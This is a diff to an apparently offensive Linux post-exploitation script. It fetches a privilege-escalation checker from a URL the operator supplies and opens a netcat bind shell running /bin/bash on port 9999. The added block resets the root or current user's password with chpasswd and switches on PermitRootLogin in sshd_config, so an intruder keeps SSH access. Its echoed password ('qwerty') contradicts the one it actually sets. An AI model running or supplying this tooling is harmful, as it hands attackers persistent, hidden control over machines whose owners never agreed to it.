@@ -39,10 +39,33 @@ if [ -z "$1" ]
   wget $1linuxprivchecker.py -O /tmp/LPC.py
 
   # build a NC bind shell incase we lose a shell
-  echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
+  echo "[*] Attempting to bind a shell to 9999 incase you lose your shell (not reliable - sometimes works)"
   /tmp/nc -nlvp 9999 -e /bin/bash &
   # chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
   sleep 2s
+  
+  # Configure ssh to allow for root logins / prep ssh for us
+  echo "[*] Attempting to config SSH for relaible shell / ssh tunnel"
+  if [ "$EUID" -eq 0 ]
+    then
+    echo "-[*] running as root - enabling SSH access for root"
+    echo "-[*] resetting password: $USER : qwerty"
+    sudo echo 'root:passwd' | chpasswd
+    echo "-[*] configuring sshd_config to allow root logins"
+    sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
+    echo "-[!] complete."
+  else
+    echo "-[*] we are not running as root [$USER]"
+    echo "-[*] resetting password : $USER : qwerty"
+    echo "$USER:passwd" | chpasswd
+    echo "-[!] complete. please be aware that if this user has been denioed SSH access, we wont be able to connect"
+
+  fi
+  echo "-[*] detecting which ports ssh is availble on"
+  netstat -tpln | egrep '(Proto|ssh)'
+
+
+
 
   # semi interactive shell
   echo "[*] Attempting to build semi-interactive shell "
